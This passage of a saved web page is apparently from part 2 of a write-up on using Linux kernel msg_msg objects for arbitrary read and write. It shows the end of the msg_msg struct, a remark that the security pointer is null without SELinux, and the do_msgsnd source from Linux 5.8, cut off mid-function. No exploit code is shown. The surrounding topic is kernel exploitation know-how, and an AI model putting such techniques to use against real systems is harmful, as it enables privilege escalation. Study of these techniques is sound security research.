          <td id="file-msg_msg_struct-h-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">/*</span> the actual message follows immediately <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-msg_msg_struct-h-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-msg_msg_struct-h-LC8" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/msg_msg_struct.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-msg_msg_struct-h">
          msg_msg_struct.h
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>
  
  
  In our case, the security pointer will always be null, since there is no SELinux.<br><br>Looking at <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L840">do_msgsnd</a>:</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(2).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-do_msgsnd-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="do_msgsnd.c">
        <tbody><tr>
          <td id="file-do_msgsnd-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-do_msgsnd-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">do_msgsnd</span>(<span class="pl-k">int</span> msqid, <span class="pl-k">long</span> mtype, <span class="pl-k">void</span> __user *mtext,</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-do_msgsnd-c-LC2" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">size_t</span> msgsz, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-do_msgsnd-c-LC3" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-do_msgsnd-c-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_queue *msq;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-do_msgsnd-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msg *msg;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-do_msgsnd-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> err;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-do_msgsnd-c-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> ipc_namespace *ns;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-do_msgsnd-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">DEFINE_WAKE_Q</span>(wake_q);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-do_msgsnd-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-do_msgsnd-c-LC10" class="blob-code blob-code-inner js-file-line">    ns = current-&gt;<span class="pl-smi">nsproxy</span>-&gt;<span class="pl-smi">ipc_ns</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-do_msgsnd-c-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-do_msgsnd-c-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (msgsz &gt; ns-&gt;<span class="pl-smi">msg_ctlmax</span> || (<span class="pl-k">long</span>) msgsz &lt; <span class="pl-c1">0</span> || msqid &lt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-do_msgsnd-c-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -EINVAL;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-do_msgsnd-c-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (mtype &lt; <span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-do_msgsnd-c-LC15" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -EINVAL;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-do_msgsnd-c-LC16" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-do_msgsnd-c-LC17" class="blob-code blob-code-inner js-file-line">    msg = <span class="pl-c1">load_msg</span>(mtext, msgsz);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-do_msgsnd-c-LC18" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">IS_ERR</span>(msg))</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-do_msgsnd-c-LC19" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">PTR_ERR</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-do_msgsnd-c-LC20" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-do_msgsnd-c-LC21" class="blob-code blob-code-inner js-file-line">    msg-&gt;<span class="pl-smi">m_type</span> = mtype;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-do_msgsnd-c-LC22" class="blob-code blob-code-inner js-file-line">    msg-&gt;<span class="pl-smi">m_ts</span> = msgsz;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-do_msgsnd-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-do_msgsnd-c-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">rcu_read_lock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-do_msgsnd-c-LC25" class="blob-code blob-code-inner js-file-line">    msq = <span class="pl-c1">msq_obtain_object_check</span>(ns, msqid);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-do_msgsnd-c-LC26" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">IS_ERR</span>(msq)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-do_msgsnd-c-LC27" class="blob-code blob-code-inner js-file-line">        err = <span class="pl-c1">PTR_ERR</span>(msq);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-do_msgsnd-c-LC28" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">goto</span> out_unlock1;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-do_msgsnd-c-LC29" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-do_msgsnd-c-LC30" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-do_msgsnd-c-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ipc_lock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-do_msgsnd-c-LC32" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-do_msgsnd-c-LC33" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (;;) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-do_msgsnd-c-LC34" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">struct</span> msg_sender s;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-do_msgsnd-c-LC35" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-do_msgsnd-c-LC36" class="blob-code blob-code-inner js-file-line">        err = -EACCES;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-do_msgsnd-c-LC37" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">ipcperms</span>(ns, &amp;msq-&gt;<span class="pl-smi">q_perm</span>, S_IWUGO))</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L38" class="blob-num js-line-number js-code-nav-line-number" data-line-number="38"></td>
          <td id="file-do_msgsnd-c-LC38" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L39" class="blob-num js-line-number js-code-nav-line-number" data-line-number="39"></td>
          <td id="file-do_msgsnd-c-LC39" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L40" class="blob-num js-line-number js-code-nav-line-number" data-line-number="40"></td>
          <td id="file-do_msgsnd-c-LC40" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> raced with RMID? <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L41" class="blob-num js-line-number js-code-nav-line-number" data-line-number="41"></td>
          <td id="file-do_msgsnd-c-LC41" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (!<span class="pl-c1">ipc_valid_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L42" class="blob-num js-line-number js-code-nav-line-number" data-line-number="42"></td>
          <td id="file-do_msgsnd-c-LC42" class="blob-code blob-code-inner js-file-line">            err = -EIDRM;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
          <td id="file-do_msgsnd-c-LC43" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
          <td id="file-do_msgsnd-c-LC44" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L45" class="blob-num js-line-number js-code-nav-line-number" data-line-number="45"></td>
          <td id="file-do_msgsnd-c-LC45" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L46" class="blob-num js-line-number js-code-nav-line-number" data-line-number="46"></td>
          <td id="file-do_msgsnd-c-LC46" class="blob-code blob-code-inner js-file-line">        err = <span class="pl-c1">security_msg_queue_msgsnd</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>, msg, msgflg);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L47" class="blob-num js-line-number js-code-nav-line-number" data-line-number="47"></td>
          <td id="file-do_msgsnd-c-LC47" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (err)</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L48" class="blob-num js-line-number js-code-nav-line-number" data-line-number="48"></td>
          <td id="file-do_msgsnd-c-LC48" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L49" class="blob-num js-line-number js-code-nav-line-number" data-line-number="49"></td>
          <td id="file-do_msgsnd-c-LC49" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
          <td id="file-do_msgsnd-c-LC50" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">msg_fits_inqueue</span>(msq, msgsz))</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
          <td id="file-do_msgsnd-c-LC51" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L52" class="blob-num js-line-number js-code-nav-line-number" data-line-number="52"></td>
          <td id="file-do_msgsnd-c-LC52" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L53" class="blob-num js-line-number js-code-nav-line-number" data-line-number="53"></td>
          <td id="file-do_msgsnd-c-LC53" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> queue full, wait: <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L54" class="blob-num js-line-number js-code-nav-line-number" data-line-number="54"></td>
          <td id="file-do_msgsnd-c-LC54" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (msgflg &amp; IPC_NOWAIT) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L55" class="blob-num js-line-number js-code-nav-line-number" data-line-number="55"></td>
          <td id="file-do_msgsnd-c-LC55" class="blob-code blob-code-inner js-file-line">            err = -EAGAIN;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L56" class="blob-num js-line-number js-code-nav-line-number" data-line-number="56"></td>
          <td id="file-do_msgsnd-c-LC56" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
          <td id="file-do_msgsnd-c-LC57" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
          <td id="file-do_msgsnd-c-LC58" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L59" class="blob-num js-line-number js-code-nav-line-number" data-line-number="59"></td>
          <td id="file-do_msgsnd-c-LC59" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> enqueue the sender and prepare to block <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L60" class="blob-num js-line-number js-code-nav-line-number" data-line-number="60"></td>
          <td id="file-do_msgsnd-c-LC60" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ss_add</span>(msq, &amp;s, msgsz);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L61" class="blob-num js-line-number js-code-nav-line-number" data-line-number="61"></td>
          <td id="file-do_msgsnd-c-LC61" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L62" class="blob-num js-line-number js-code-nav-line-number" data-line-number="62"></td>
          <td id="file-do_msgsnd-c-LC62" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (!<span class="pl-c1">ipc_rcu_getref</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L63" class="blob-num js-line-number js-code-nav-line-number" data-line-number="63"></td>
          <td id="file-do_msgsnd-c-LC63" class="blob-code blob-code-inner js-file-line">            err = -EIDRM;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L64" class="blob-num js-line-number js-code-nav-line-number" data-line-number="64"></td>
          <td id="file-do_msgsnd-c-LC64" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L65" class="blob-num js-line-number js-code-nav-line-number" data-line-number="65"></td>
          <td id="file-do_msgsnd-c-LC65" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L66" class="blob-num js-line-number js-code-nav-line-number" data-line-number="66"></td>
          <td id="file-do_msgsnd-c-LC66" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L67" class="blob-num js-line-number js-code-nav-line-number" data-line-number="67"></td>
          <td id="file-do_msgsnd-c-LC67" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_unlock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L68" class="blob-num js-line-number js-code-nav-line-number" data-line-number="68"></td>
          <td id="file-do_msgsnd-c-LC68" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">rcu_read_unlock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L69" class="blob-num js-line-number js-code-nav-line-number" data-line-number="69"></td>
          <td id="file-do_msgsnd-c-LC69" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">schedule</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L70" class="blob-num js-line-number js-code-nav-line-number" data-line-number="70"></td>
          <td id="file-do_msgsnd-c-LC70" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L71" class="blob-num js-line-number js-code-nav-line-number" data-line-number="71"></td>
          <td id="file-do_msgsnd-c-LC71" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">rcu_read_lock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L72" class="blob-num js-line-number js-code-nav-line-number" data-line-number="72"></td>
          <td id="file-do_msgsnd-c-LC72" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_lock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L73" class="blob-num js-line-number js-code-nav-line-number" data-line-number="73"></td>
          <td id="file-do_msgsnd-c-LC73" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L74" class="blob-num js-line-number js-code-nav-line-number" data-line-number="74"></td>
          <td id="file-do_msgsnd-c-LC74" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_rcu_putref</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>, msg_rcu_free);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L75" class="blob-num js-line-number js-code-nav-line-number" data-line-number="75"></td>
          <td id="file-do_msgsnd-c-LC75" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> raced with RMID? <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L76" class="blob-num js-line-number js-code-nav-line-number" data-line-number="76"></td>
          <td id="file-do_msgsnd-c-LC76" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (!<span class="pl-c1">ipc_valid_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L77" class="blob-num js-line-number js-code-nav-line-number" data-line-number="77"></td>
          <td id="file-do_msgsnd-c-LC77" class="blob-code blob-code-inner js-file-line">            err = -EIDRM;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L78" class="blob-num js-line-number js-code-nav-line-number" data-line-number="78"></td>
          <td id="file-do_msgsnd-c-LC78" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L79" class="blob-num js-line-number js-code-nav-line-number" data-line-number="79"></td>
          <td id="file-do_msgsnd-c-LC79" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L80" class="blob-num js-line-number js-code-nav-line-number" data-line-number="80"></td>
          <td id="file-do_msgsnd-c-LC80" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ss_del</span>(&amp;s);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L81" class="blob-num js-line-number js-code-nav-line-number" data-line-number="81"></td>
          <td id="file-do_msgsnd-c-LC81" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L82" class="blob-num js-line-number js-code-nav-line-number" data-line-number="82"></td>
          <td id="file-do_msgsnd-c-LC82" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">signal_pending</span>(current)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L83" class="blob-num js-line-number js-code-nav-line-number" data-line-number="83"></td>
          <td id="file-do_msgsnd-c-LC83" class="blob-code blob-code-inner js-file-line">            err = -ERESTARTNOHAND;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L84" class="blob-num js-line-number js-code-nav-line-number" data-line-number="84"></td>
          <td id="file-do_msgsnd-c-LC84" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L85" class="blob-num js-line-number js-code-nav-line-number" data-line-number="85"></td>
          <td id="file-do_msgsnd-c-LC85" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L86" class="blob-num js-line-number js-code-nav-line-number" data-line-number="86"></td>
          <td id="file-do_msgsnd-c-LC86" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L87" class="blob-num js-line-number js-code-nav-line-number" data-line-number="87"></td>
          <td id="file-do_msgsnd-c-LC87" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L88" class="blob-num js-line-number js-code-nav-line-number" data-line-number="88"></td>
          <td id="file-do_msgsnd-c-LC88" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L89" class="blob-num js-line-number js-code-nav-line-number" data-line-number="89"></td>
          <td id="file-do_msgsnd-c-LC89" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ipc_update_pid</span>(&amp;msq-&gt;<span class="pl-smi">q_lspid</span>, <span class="pl-c1">task_tgid</span>(current));</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L90" class="blob-num js-line-number js-code-nav-line-number" data-line-number="90"></td>
          <td id="file-do_msgsnd-c-LC90" class="blob-code blob-code-inner js-file-line">    msq-&gt;<span class="pl-smi">q_stime</span> = <span class="pl-c1">ktime_get_real_seconds</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L91" class="blob-num js-line-number js-code-nav-line-number" data-line-number="91"></td>
          <td id="file-do_msgsnd-c-LC91" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L92" class="blob-num js-line-number js-code-nav-line-number" data-line-number="92"></td>
          <td id="file-do_msgsnd-c-LC92" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (!<span class="pl-c1">pipelined_send</span>(msq, msg, &amp;wake_q)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L93" class="blob-num js-line-number js-code-nav-line-number" data-line-number="93"></td>
          <td id="file-do_msgsnd-c-LC93" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">/*</span> no one is waiting for this message, enqueue it <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L94" class="blob-num js-line-number js-code-nav-line-number" data-line-number="94"></td>
          <td id="file-do_msgsnd-c-LC94" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">list_add_tail</span>(&amp;msg-&gt;<span class="pl-smi">m_list</span>, &amp;msq-&gt;<span class="pl-smi">q_messages</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L95" class="blob-num js-line-number js-code-nav-line-number" data-line-number="95"></td>
          <td id="file-do_msgsnd-c-LC95" class="blob-code blob-code-inner js-file-line">        msq-&gt;<span class="pl-smi">q_cbytes</span> += msgsz;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L96" class="blob-num js-line-number js-code-nav-line-number" data-line-number="96"></td>
          <td id="file-do_msgsnd-c-LC96" class="blob-code blob-code-inner js-file-line">        msq-&gt;<span class="pl-smi">q_qnum</span>++;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L97" class="blob-num js-line-number js-code-nav-line-number" data-line-number="97"></td>
          <td id="file-do_msgsnd-c-LC97" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">atomic_add</span>(msgsz, &amp;ns-&gt;<span class="pl-smi">msg_bytes</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L98" class="blob-num js-line-number js-code-nav-line-number" data-line-number="98"></td>
          <td id="file-do_msgsnd-c-LC98" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">atomic_inc</span>(&amp;ns-&gt;<span class="pl-smi">msg_hdrs</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L99" class="blob-num js-line-number js-code-nav-line-number" data-line-number="99"></td>
          <td id="file-do_msgsnd-c-LC99" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L100" class="blob-num js-line-number js-code-nav-line-number" data-line-number="100"></td>
          <td id="file-do_msgsnd-c-LC100" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L101" class="blob-num js-line-number js-code-nav-line-number" data-line-number="101"></td>
          <td id="file-do_msgsnd-c-LC101" class="blob-code blob-code-inner js-file-line">    err = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L102" class="blob-num js-line-number js-code-nav-line-number" data-line-number="102"></td>
          <td id="file-do_msgsnd-c-LC102" class="blob-code blob-code-inner js-file-line">    msg = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L103" class="blob-num js-line-number js-code-nav-line-number" data-line-number="103"></td>
